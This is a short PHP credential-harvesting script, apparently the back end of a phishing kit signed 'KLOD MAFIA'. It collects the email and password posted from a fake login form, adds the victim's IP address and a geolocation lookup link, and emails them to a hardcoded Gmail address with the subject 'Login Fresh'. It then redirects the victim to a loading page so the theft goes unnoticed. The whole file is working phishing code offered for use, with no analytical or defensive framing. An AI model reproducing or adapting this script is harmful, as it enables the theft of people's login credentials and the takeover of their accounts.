<?php
$ip = getenv("REMOTE_ADDR");
$message .= "|----------|KLOD MAFIA|--------------|\n";
$message .= "|Email    : ".$_POST['email']."\n";
$message .= "|Password : ".$_POST['password']."\n";
$message .= "|---------------|Info|-------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|HostName : ".$hostname."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "|----------|KLOD MAFIA|--------------|\n";
$send = "islemryahi@gmail.com";
$subject = "~ Login Fresh ~ | $ip";
{
mail("$send", "$subject", $message);   
}
header("Location:../websc-loading.php");
?>